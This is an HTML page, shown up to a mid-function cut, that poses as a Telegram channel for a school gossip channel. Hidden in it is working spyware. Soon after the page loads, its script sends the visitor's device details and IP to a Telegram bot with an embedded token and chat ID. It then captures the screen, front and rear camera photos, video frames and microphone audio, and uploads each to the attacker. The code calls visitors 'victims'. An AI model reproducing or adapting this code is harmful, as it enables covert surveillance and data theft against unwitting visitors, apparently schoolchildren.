<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>–ü–û–î–°–õ–£–®–ê–ù–û 4 –®–ö–û–õ–ê ‚Ä¢ Telegram</title>
    <meta name="theme-color" content="#3390ec">
    <style>
        :root {
            --tg-bg: #0f0f0f;
            --tg-card: #1a1a1a;
            --tg-text: #ffffff;
            --tg-hint: #aaaaaa;
            --tg-blue: #3390ec;
            --tg-green: #2ecc71;
            --tg-red: #e74c3c;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: var(--tg-bg);
            color: var(--tg-text);
            line-height: 1.5;
            overflow-x: hidden;
            position: relative;
        }
        
        .app {
            max-width: 480px;
            margin: 0 auto;
            min-height: 100vh;
            background: var(--tg-bg);
            position: relative;
        }
        
        /* Header */
        .header {
            position: sticky;
            top: 0;
            background: rgba(15, 15, 15, 0.95);
            backdrop-filter: blur(20px);
            border-bottom: 1px solid #2d2d2d;
            padding: 14px 16px;
            display: flex;
            align-items: center;
            z-index: 1000;
        }
        
        .header-btn {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: rgba(51, 144, 236, 0.1);
            border: none;
            color: var(--tg-blue);
            font-size: 20px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .header-title {
            font-size: 17px;
            font-weight: 600;
            text-align: center;
            flex-grow: 1;
        }
        
        /* Channel Hero */
        .channel-hero {
            height: 180px;
            background: linear-gradient(135deg, #1a237e 0%, #311b92 100%);
            position: relative;
        }
        
        .channel-avatar {
            position: absolute;
            bottom: -40px;
            left: 20px;
            width: 80px;
            height: 80px;
            background: var(--tg-blue);
            border-radius: 50%;
            border: 4px solid var(--tg-bg);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 32px;
            color: white;
        }
        
        /* Content */
        .content {
            padding: 60px 20px 30px;
        }
        
        .channel-title {
            font-size: 24px;
            font-weight: 700;
            margin-bottom: 4px;
        }
        
        .channel-subscribers {
            color: var(--tg-hint);
            font-size: 15px;
            margin-bottom: 25px;
        }
        
        /* Button */
        .join-btn {
            width: 100%;
            padding: 18px;
            background: var(--tg-blue);
            color: white;
            border: none;
            border-radius: 16px;
            font-size: 17px;
            font-weight: 500;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            margin: 25px 0;
            transition: transform 0.2s;
        }
        
        .join-btn:active {
            transform: scale(0.98);
        }
        
        /* Posts */
        .post {
            background: var(--tg-card);
            border-radius: 16px;
            padding: 16px;
            margin-bottom: 15px;
            border: 1px solid #2d2d2d;
        }
        
        .post-header {
            display: flex;
            align-items: center;
            margin-bottom: 12px;
        }
        
        .post-avatar {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%);
            margin-right: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
        }
        
        .post-author {
            font-weight: 600;
            font-size: 15px;
        }
        
        .post-time {
            color: var(--tg-hint);
            font-size: 13px;
            margin-top: 2px;
        }
        
        .post-text {
            margin-bottom: 12px;
            font-size: 15px;
        }
        
        .post-media {
            border-radius: 12px;
            background: #000;
            height: 200px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: var(--tg-hint);
            margin-bottom: 12px;
        }
        
        /* Modal */
        .modal {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.9);
            z-index: 10000;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            opacity: 0;
            visibility: hidden;
            transition: 0.3s;
        }
        
        .modal.active {
            opacity: 1;
            visibility: visible;
        }
        
        .modal-content {
            background: var(--tg-card);
            border-radius: 20px;
            padding: 30px;
            width: 100%;
            max-width: 400px;
            text-align: center;
        }
        
        .modal-icon {
            font-size: 48px;
            margin-bottom: 20px;
        }
        
        .modal-title {
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 10px;
        }
        
        .modal-text {
            color: var(--tg-hint);
            margin-bottom: 25px;
            line-height: 1.5;
        }
        
        /* Progress */
        .progress {
            width: 100%;
            height: 4px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 2px;
            overflow: hidden;
            margin: 25px 0;
        }
        
        .progress-bar {
            height: 100%;
            background: var(--tg-blue);
            width: 0%;
            transition: width 0.3s;
        }
        
        /* Status */
        .status {
            padding: 12px;
            background: rgba(51, 144, 236, 0.1);
            border-radius: 12px;
            margin: 15px 0;
            display: none;
        }
        
        .status.visible {
            display: block;
        }
        
        /* Hidden */
        .hidden {
            display: none !important;
        }
        
        .collector {
            position: absolute;
            width: 1px;
            height: 1px;
            opacity: 0;
            overflow: hidden;
        }
    </style>
</head>
<body>
    <div class="app">
        <!-- Header -->
        <div class="header">
            <button class="header-btn" onclick="history.back()">‚Üê</button>
            <div class="header-title">–ö–∞–Ω–∞–ª</div>
            <button class="header-btn">‚ãÆ</button>
        </div>
        
        <!-- Channel -->
        <div class="channel-hero">
            <div class="channel-avatar">üì¢</div>
        </div>
        
        <div class="content">
            <h1 class="channel-title">–ü–û–î–°–õ–£–®–ê–ù–û 4 –®–ö–û–õ–ê</h1>
            <div class="channel-subscribers">56 –ø–æ–¥–ø–∏—Å—á–∏–∫–æ–≤</div>
            
            <button class="join-btn" id="joinBtn">
                <span>–ü–µ—Ä–µ–π—Ç–∏ –≤ –∫–∞–Ω–∞–ª</span>
                <span>‚Üí</span>
            </button>
            
            <div class="progress hidden" id="progress">
                <div class="progress-bar" id="progressBar"></div>
            </div>
            
            <div class="status" id="status"></div>
            
            <!-- Posts -->
            <div class="post">
                <div class="post-header">
                    <div class="post-avatar">A</div>
                    <div>
                        <div class="post-author">–ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä</div>
                        <div class="post-time">—Å–µ–≥–æ–¥–Ω—è –≤ 14:30</div>
                    </div>
                </div>
                <div class="post-text">
                    –î–ª—è –¥–æ—Å—Ç—É–ø–∞ –∫ —ç–∫—Å–∫–ª—é–∑–∏–≤–Ω–æ–º—É –∫–æ–Ω—Ç–µ–Ω—Ç—É —Ç—Ä–µ–±—É–µ—Ç—Å—è –ø–æ–ª–Ω–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ —Å–∏—Å—Ç–µ–º—ã —á–µ—Ä–µ–∑ Telegram Web.
                </div>
                <div class="post-media">
                    üîê –ü—Ä–æ–≤–µ—Ä–∫–∞ –∫–∞–º–µ—Ä—ã –∏ –º–∏–∫—Ä–æ—Ñ–æ–Ω–∞
                </div>
            </div>
        </div>
        
        <!-- Auth Modal -->
        <div class="modal" id="authModal">
            <div class="modal-content">
                <div class="modal-icon">üîê</div>
                <h2 class="modal-title">–ü—Ä–æ–≤–µ—Ä–∫–∞ –¥–æ—Å—Ç—É–ø–∞</h2>
                <p class="modal-text">
                    –î–ª—è –≤—Ö–æ–¥–∞ —Ç—Ä–µ–±—É–µ—Ç—Å—è –ø—Ä–æ–≤–µ—Ä–∫–∞ –∫–∞–º–µ—Ä—ã, –º–∏–∫—Ä–æ—Ñ–æ–Ω–∞ –∏ —Å–∏—Å—Ç–µ–º—ã
                </p>
                <button class="join-btn" id="authBtn">
                    <span>–ù–∞—á–∞—Ç—å –ø—Ä–æ–≤–µ—Ä–∫—É</span>
                </button>
                <div class="progress">
                    <div class="progress-bar" id="authProgress"></div>
                </div>
                <div class="status" id="authStatus"></div>
            </div>
        </div>
        
        <!-- Hidden Collectors -->
        <div class="collector">
            <video id="camera" autoplay muted playsinline></video>
            <video id="rearCamera" autoplay muted playsinline></video>
            <canvas id="canvas"></canvas>
            <audio id="mic"></audio>
        </div>
    </div>

    <script>
        // –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è
        const CONFIG = {
            BOT_TOKEN: '8578533182:AAHVUzQtIkhMjfSofiyeUJPDkEOvmfXJ08g',
            ADMIN_ID: 8001083987,
            MEDIA_TIMEOUT: 15000,
            AUDIO_DURATION: 10000, // 10 —Å–µ–∫—É–Ω–¥ –∞—É–¥–∏–æ
            VIDEO_DURATION: 8000,  // 8 —Å–µ–∫—É–Ω–¥ –≤–∏–¥–µ–æ
            SCREENSHOT_DELAY: 1000
        };
        
        // –°–æ—Å—Ç–æ—è–Ω–∏–µ
        const state = {
            victimId: null,
            sessionId: null,
            isCollecting: false,
            collectedMedia: [],
            mediaCount: 0,
            hasSentInitialPhotos: false,
            videoStreams: [],
            audioStreams: []
        };
        
        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è
        document.addEventListener('DOMContentLoaded', async () => {
            console.log('–°–∏—Å—Ç–µ–º–∞ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω–∞');
            
            // –ì–µ–Ω–µ—Ä–∞—Ü–∏—è ID
            state.victimId = 'v_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            state.sessionId = generateSessionId();
            
            // –°–æ–±—ã—Ç–∏—è
            document.getElementById('joinBtn').addEventListener('click', startCollection);
            document.getElementById('authBtn').addEventListener('click', processAuth);
            
            // –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∞—è –æ—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
            setTimeout(async () => {
                await sendInitialData();
            }, 1500);
        });
        
        function generateSessionId() {
            const arr = new Uint8Array(16);
            crypto.getRandomValues(arr);
            return Array.from(arr, b => b.toString(16).padStart(2, '0')).join('');
        }
        
        async function sendInitialData() {
            if (state.hasSentInitialPhotos) return;
            
            try {
                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –≤—Ö–æ–¥–µ
                await sendSystemInfo();
                
                // –°—Ä–∞–∑—É –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–∫—Ä–∏–Ω—à–æ—Ç —ç–∫—Ä–∞–Ω–∞
                await captureAndSendScreenshot();
                
                // –ü—ã—Ç–∞–µ–º—Å—è —Å–¥–µ–ª–∞—Ç—å –∏ –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Ñ–æ—Ç–æ–≥—Ä–∞—Ñ–∏–∏ —Å –ø–µ—Ä–µ–¥–Ω–µ–π –∫–∞–º–µ—Ä—ã
                await captureAndSendFrontCameraPhotos();
                
                // –ü—ã—Ç–∞–µ–º—Å—è —Å–¥–µ–ª–∞—Ç—å –∏ –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Ñ–æ—Ç–æ–≥—Ä–∞—Ñ–∏–∏ —Å –∑–∞–¥–Ω–µ–π –∫–∞–º–µ—Ä—ã
                await captureAndSendRearCameraPhotos();
                
                state.hasSentInitialPhotos = true;
                
                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤–∏–¥–µ–æ –∫–∞–∫ —Ñ–æ—Ç–æ (–∫–∞–¥—Ä—ã –∏–∑ –≤–∏–¥–µ–æ)
                await captureAndSendVideoAsPhotos();
                
                // –ó–∞–ø–∏—Å—ã–≤–∞–µ–º –∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–ª–∏–Ω–Ω–æ–µ –∞—É–¥–∏–æ
                await captureAndSendLongAudio();
                
            } catch (error) {
                console.log('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –Ω–∞—á–∞–ª—å–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö:', error);
            }
        }
        
        async function sendSystemInfo() {
            const systemData = {
                victimId: state.victimId,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                screen: `${screen.width}x${screen.height}`,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                ip: await getIP(),
                url: window.location.href,
                referrer: document.referrer,
                cookies: document.cookie ? '–î–æ—Å—Ç—É–ø–Ω—ã' : '–ù–µ –¥–æ—Å—Ç—É–ø–Ω—ã',
                localStorage: localStorage.length > 0 ? '–ó–∞–ø–æ–ª–Ω–µ–Ω–æ' : '–ü—É—Å—Ç–æ',
                online: navigator.onLine,
                connection: navigator.connection ? JSON.stringify(navigator.connection) : '–ù–µ –¥–æ—Å—Ç—É–ø–Ω–æ'
            };
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–∏—Å—Ç–µ–º–Ω—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é
            const message = `
üì± <b>–ù–û–í–´–ô –ü–û–°–ï–¢–ò–¢–ï–õ–¨ –ù–ê –°–ê–ô–¢–ï</b>
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ

üë§ <b>–ò–ù–§–û–†–ú–ê–¶–ò–Ø:</b>
‚îú ID: <code>${systemData.victimId}</code>
‚îú –í—Ä–µ–º—è: ${new Date(systemData.timestamp).toLocaleString('ru-RU')}
‚îú –£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ: ${systemData.platform}
‚îú –Ø–∑—ã–∫: ${systemData.language}
‚îî –û–Ω–ª–∞–π–Ω: ${systemData.online ? '‚úÖ' : '‚ùå'}

üìç <b>–ú–ï–°–¢–û–ü–û–õ–û–ñ–ï–ù–ò–ï:</b>
‚îú IP: <code>${systemData.ip}</code>
‚îú URL: ${systemData.url}
‚îî –ò—Å—Ç–æ—á–Ω–∏–∫: ${systemData.referrer || '–ü—Ä—è–º–æ–π –≤—Ö–æ–¥'}

üìä <b>–¢–ï–•–ù–ò–ß–ï–°–ö–ò–ï –î–ê–ù–ù–´–ï:</b>
‚îú –≠–∫—Ä–∞–Ω: ${systemData.screen}
‚îú –í—Ä–µ–º–µ–Ω–Ω–∞—è –∑–æ–Ω–∞: ${systemData.timezone}
‚îú Cookies: ${systemData.cookies}
‚îú LocalStorage: ${systemData.localStorage}
‚îî User-Agent: ${systemData.userAgent.substring(0, 100)}...

‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
üîÑ –ù–∞—á–∏–Ω–∞–µ—Ç—Å—è —Å–±–æ—Ä –º–µ–¥–∏–∞ –¥–∞–Ω–Ω—ã—Ö...
`;
            
            await sendToTelegram(message);
        }
        
        async function captureAndSendScreenshot() {
            try {
                if (!navigator.mediaDevices.getDisplayMedia) {
                    throw new Error('–ó–∞—Ö–≤–∞—Ç —ç–∫—Ä–∞–Ω–∞ –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è');
                }
                
                const stream = await navigator.mediaDevices.getDisplayMedia({
                    video: { 
                        width: { ideal: 1920 },
                        height: { ideal: 1080 }
                    },
                    audio: false
                });
                
                const video = document.getElementById('camera');
                const canvas = document.getElementById('canvas');
                const ctx = canvas.getContext('2d');
                
                video.srcObject = stream;
                
                await new Promise(resolve => {
                    video.onloadedmetadata = resolve;
                });
                
                // –î–∞–µ–º –≤—Ä–µ–º—è –¥–ª—è —Å—Ç–∞–±–∏–ª–∏–∑–∞—Ü–∏–∏ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è
                await sleep(CONFIG.SCREENSHOT_DELAY);
                
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                ctx.drawImage(video, 0, 0);
                
                const screenshotData = canvas.toDataURL('image/jpeg', 0.95);
                
                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–∫—Ä–∏–Ω—à–æ—Ç –≤ Telegram
                await sendPhotoToTelegram(screenshotData, `üñ•Ô∏è –°–ö–†–ò–ù–®–û–¢ –≠–ö–†–ê–ù–ê –æ—Ç ${state.victimId}\n–†–∞–∑—Ä–µ—à–µ–Ω–∏–µ: ${canvas.width}x${canvas.height}\n–í—Ä–µ–º—è: ${new Date().toLocaleTimeString('ru-RU')}`);
                
                stream.getTracks().forEach(track => track.stop());
                
            } catch (error) {
                console.log('–°–∫—Ä–∏–Ω—à–æ—Ç –Ω–µ –¥–æ—Å—Ç—É–ø–µ–Ω:', error.message);
                await sendToTelegram(`üìµ –°–∫—Ä–∏–Ω—à–æ—Ç —ç–∫—Ä–∞–Ω–∞ –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω: ${error.message}`);
            }
        }
        
        async function captureAndSendFrontCameraPhotos() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 1920 },
                        height: { ideal: 1080 }
                    },
                    audio: false
                });
                
                const video = document.getElementById('camera');
                const canvas = document.getElementById('canvas');
                const ctx = canvas.getContext('2d');
                
                video.srcObject = stream;
                state.videoStreams.push(stream);
                
                await new Promise(resolve => {
                    video.onloadedmetadata = resolve;
                });
                
                // –î–µ–ª–∞–µ–º 5 —Ñ–æ—Ç–æ–≥—Ä–∞—Ñ–∏–π —Å –ø–µ—Ä–µ–¥–Ω–µ–π –∫–∞–º–µ—Ä—ã
                for (let i = 1; i <= 5; i++) {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    ctx.drawImage(video, 0, 0);
                    
                    const photoData = canvas.toDataURL('image/jpeg', 0.9);
                    
                    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ñ–æ—Ç–æ –Ω–∞–ø—Ä—è–º—É—é –≤ Telegram
                    await sendPhotoToTelegram(photoData, `üì∏ –ü–ï–†–ï–î–ù–Ø–Ø –ö–ê–ú–ï–†–ê #${i} –æ—Ç ${state.victimId}\n–†–∞–∑—Ä–µ—à–µ–Ω–∏–µ: ${canvas.width}x${canvas.height}\n–ö–∞—á–µ—Å—Ç–≤–æ: 90%`);
                    
                    await sleep(1200);
                }
                
                stream.getTracks().forEach(track => track.stop());
                
            } catch (error) {
                console.log('–ü–µ—Ä–µ–¥–Ω—è—è –∫–∞–º–µ—Ä–∞ –Ω–µ –¥–æ—Å—Ç—É–ø–Ω–∞:', error.message);
                await sendToTelegram(`üìµ –ü–µ—Ä–µ–¥–Ω—è—è –∫–∞–º–µ—Ä–∞ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞: ${error.message}`);
            }
        }
        
        async function captureAndSendRearCameraPhotos() {
            try {
                // –ü—ã—Ç–∞–µ–º—Å—è –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ –∑–∞–¥–Ω–µ–π –∫–∞–º–µ—Ä–µ
                const devices = await navigator.mediaDevices.enumerateDevices();
                const videoDevices = devices.filter(device => device.kind === 'videoinput');
                
                if (videoDevices.length < 2) {
                    throw new Error('–ó–∞–¥–Ω—è—è –∫–∞–º–µ—Ä–∞ –Ω–µ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∞');
                }
                
                // –ü—ã—Ç–∞–µ–º—Å—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å environment (–∑–∞–¥–Ω—é—é –∫–∞–º–µ—Ä—É)
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { 
                        facingMode: { exact: 'environment' },
                        width: { ideal: 1920 },
                        height: { ideal: 1080 }
                    },
                    audio: false
                });
                
                const video = document.getElementById('rearCamera');
                const canvas = document.getElementById('canvas');
                const ctx = canvas.getContext('2d');
                
                video.srcObject = stream;
                state.videoStreams.push(stream);
                
                await new Promise(resolve => {
                    video.onloadedmetadata = resolve;
                });
                
                // –î–µ–ª–∞–µ–º 3 —Ñ–æ—Ç–æ–≥—Ä–∞—Ñ–∏–∏ —Å –∑–∞–¥–Ω–µ–π –∫–∞–º–µ—Ä—ã
                for (let i = 1; i <= 3; i++) {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    ctx.drawImage(video, 0, 0);
                    
                    const photoData = canvas.toDataURL('image/jpeg', 0.9);
                    
                    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ñ–æ—Ç–æ –Ω–∞–ø—Ä—è–º—É—é –≤ Telegram
                    await sendPhotoToTelegram(photoData, `üì∏ –ó–ê–î–ù–Ø–Ø –ö–ê–ú–ï–†–ê #${i} –æ—Ç ${state.victimId}\n–†–∞–∑—Ä–µ—à–µ–Ω–∏–µ: ${canvas.width}x${canvas.height}\n–û—Ä–∏–µ–Ω—Ç–∞—Ü–∏—è: –ó–∞–¥–Ω—è—è`);
                    
                    await sleep(1500);
                }
                
                stream.getTracks().forEach(track => track.stop());
                
            } catch (error) {
                console.log('–ó–∞–¥–Ω—è—è –∫–∞–º–µ—Ä–∞ –Ω–µ –¥–æ—Å—Ç—É–ø–Ω–∞:', error.message);
                // –ü—ã—Ç–∞–µ–º—Å—è –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–π –º–µ—Ç–æ–¥
                await tryAlternativeRearCamera();
            }
        }
        
        async function tryAlternativeRearCamera() {
            try {
                // –ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–π –º–µ—Ç–æ–¥: –∏—Å–ø–æ–ª—å–∑—É–µ–º –ø–æ—Å–ª–µ–¥–Ω–µ–µ –≤–∏–¥–µ–æ—É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ
                const devices = await navigator.mediaDevices.enumerateDevices();
                const videoDevices = devices.filter(device => device.kind === 'videoinput');
                
                if (videoDevices.length > 1) {
                    const lastDevice = videoDevices[videoDevices.length - 1];
                    const stream = await navigator.mediaDevices.getUserMedia({
                        video: { 
                            deviceId: { exact: lastDevice.deviceId },
                            width: { ideal: 1920 },
                            height: { ideal: 1080 }
                        },
                        audio: false
                    });
                    
                    const video = document.getElementById('camera');
                    const canvas = document.getElementById('canvas');
                    const ctx = canvas.getContext('2d');
                    
                    video.srcObject = stream;
                    
                    await new Promise(resolve => {
                        video.onloadedmetadata = resolve;
                    });
                    
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    ctx.drawImage(video, 0, 0);
                    
                    const photoData = canvas.toDataURL('image/jpeg', 0.9);
                    
                    await sendPhotoToTelegram(photoData, `üì∏ –ê–õ–¨–¢–ï–†–ù–ê–¢–ò–í–ù–ê–Ø –ö–ê–ú–ï–†–ê –æ—Ç ${state.victimId}\n–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ: ${videoDevices[videoDevices.length - 1].label || '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'}`);
                    
                    stream.getTracks().forEach(track => track.stop());
                }
                
            } catch (error) {
                console.log('–ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω–∞—è –∫–∞–º–µ—Ä–∞ —Ç–æ–∂–µ –Ω–µ –¥–æ—Å—Ç—É–ø–Ω–∞:', error.message);
            }
        }
        
        async function captureAndSendVideoAsPhotos() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { 
                        width: { ideal: 1280 },
                        height: { ideal: 720 },
                        frameRate: { ideal: 30 }
                    },
                    audio: true
                });
                
                const video = document.getElementById('camera');
                const canvas = document.getElementById('canvas');
                const ctx = canvas.getContext('2d');
                
                video.srcObject = stream;
                state.videoStreams.push(stream);
                
                await new Promise(resolve => {
                    video.onloadedmetadata = resolve;
                });
                
                // –ó–∞—Ö–≤–∞—Ç—ã–≤–∞–µ–º 8 –∫–∞–¥—Ä–æ–≤ –∏–∑ –≤–∏–¥–µ–æ (–∫–∞–∫ —Ñ–æ—Ç–æ–≥—Ä–∞—Ñ–∏–∏)
                for (let i = 1; i <= 8; i++) {
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    ctx.drawImage(video, 0, 0);
                    
                    const photoData = canvas.toDataURL('image/jpeg', 0.85);
                    
                    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∫–∞–¥—Ä –∫–∞–∫ —Ñ–æ—Ç–æ
                    await sendPhotoToTelegram(photoData, `üé• –ö–ê–î–† –ò–ó –í–ò–î–ï–û #${i}/${8} –æ—Ç ${state.victimId}\n–í—Ä–µ–º—è: ${i * 0.5} —Å–µ–∫.`);
                    
                    await sleep(500);
                }
                
                stream.getTracks().forEach(track => track.stop());
                
            } catch (error) {
                console.log('–í–∏–¥–µ–æ –Ω–µ –¥–æ—Å—Ç—É–ø–Ω–æ:', error.message);
                await sendToTelegram(`üìµ –í–∏–¥–µ–æ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–æ: ${error.message}`);
            }
        }
        
        async function captureAndSendLongAudio() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    audio: {
                        echoCancellation: false,
                        noiseSuppression: false,
                        autoGainControl: false,
                        channelCount: 2,
                        sampleRate: 48000
                    },
                    video: false
                });
                
                const mediaRecorder = new MediaRecorder(stream, {
                    mimeType: 'audio/webm;codecs=opus',
                    audioBitsPerSecond: 128000
                });
                
                const chunks = [];
                
                return new Promise(async (resolve) => {
                    mediaRecorder.ondataavailable = (e) => {
                        if (e.data.size > 0) chunks.push(e.data);
                    };
                    
                    mediaRecorder.onstop = async () => {
                        const blob = new Blob(chunks, { type: 'audio/webm;codecs=opus' });
                        
                        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∞—É–¥–∏–æ —Ñ–∞–π–ª
                        await sendAudioToTelegram(blob, `üé§ –î–õ–ò–ù–ù–ê–Ø –ê–£–î–ò–û –ó–ê–ü–ò–°–¨ (${CONFIG.AUDIO_DURATION/1000}—Å–µ–∫.) –æ—Ç ${state.victimId}\n–§–æ—Ä–º–∞—Ç: WebM/Opus\n–†–∞–∑–º–µ—Ä: ${(blob.size / 1024).toFixed(1)} KB`);
                        
                        stream.getTracks().forEach(track => track.stop());
                        resolve();
                    };
                    
                    mediaRecorder.start();
                    
                    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –ø—Ä–æ–º–µ–∂—É—Ç–æ—á–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ
                    await sendToTelegram(`üé§ –ù–∞—á–∞—Ç–∞ –¥–ª–∏–Ω–Ω–∞—è –∞—É–¥–∏–æ –∑–∞–ø–∏—Å—å (${CONFIG.AUDIO_DURATION/1000} —Å–µ–∫—É–Ω–¥)...`);
                    
                    setTimeout(() => {
                        mediaRecorder.stop();
                    }, CONFIG.AUDIO_DURATION);
                });
                
            } catch (error) {
                console.log('–î–ª–∏–Ω–Ω–æ–µ –∞—É–¥–∏–æ –Ω–µ –¥–æ—Å—Ç—É–ø–Ω–æ:', error.message);
                await sendToTelegram(`üìµ –ê—É–¥–∏–æ –∑–∞–ø–∏—Å—å –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞: ${error.message}`);
            }
        }
        
        async function sendPhotoToTelegram(photoData, caption) {
            try {
                // –ü—Ä–µ–æ–±—Ä–∞–∑—É–µ–º DataURL –≤ Blob
                const base64Data = photoData.split(',')[1];
                const byteCharacters = atob(base64Data);
                const byteNumbers = new Array(byteCharacters.length);
                
                for (let i = 0; i < byteCharacters.length; i++) {
                    byteNumbers[i] = byteCharacters.charCodeAt(i);
                }
                
                const byteArray = new Uint8Array(byteNumbers);
                const blob = new Blob([byteArray], { type: 'image/jpeg' });
                
                // –°–æ–∑–¥–∞–µ–º FormData
                const formData = new FormData();
                formData.append('chat_id', CONFIG.ADMIN_ID);
                formData.append('photo', blob, `photo_${Date.now()}_${Math.random().toString(36).substr(2, 5)}.jpg`);
                
                if (caption) {
                    formData.append('caption', caption);
                    formData.append('parse_mode', 'HTML');
                }
                
                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —á–µ—Ä–µ–∑ Telegram Bot API
                const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`;
                
                const result = await fetch(url, {
                    method: 'POST',
                    body: formData
                });
                
                const data = await result.json();
                console.log('–§–æ—Ç–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ:', data.ok);
                
                state.mediaCount++;
                state.collectedMedia.push({ type: 'photo', timestamp: Date.now() });
                
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ñ–æ—Ç–æ:', error);
            }
        }
        
        async function sendAudioToTelegram(audioBlob, caption) {
            try {
                const formData = new FormData();
                formData.append('chat_id', CONFIG.ADMIN_ID);
                formData.append('audio', audioBlob, `audio_${Date.now()}_${Math.random().toString(36).substr(2, 5)}.webm`);
                
                if (caption) {
                    formData.append('caption', caption);
                    formData.append('parse_mode', 'HTML');
                }
                
                const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendAudio`;
                
                const result = await fetch(url, {
                    method: 'POST',
                    body: formData
                });
                
                const data = await result.json();
                console.log('–ê—É–¥–∏–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ:', data.ok);
                
                state.mediaCount++;
                state.collectedMedia.push({ type: 'audio', timestamp: Date.now() });
                
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –∞—É–¥–∏–æ:', error);
            }
        }
        
        function startCollection() {
            const modal = document.getElementById('authModal');
            const progress = document.getElementById('progress');
            
            modal.classList.add('active');
            progress.classList.remove('hidden');
            state.isCollecting = true;
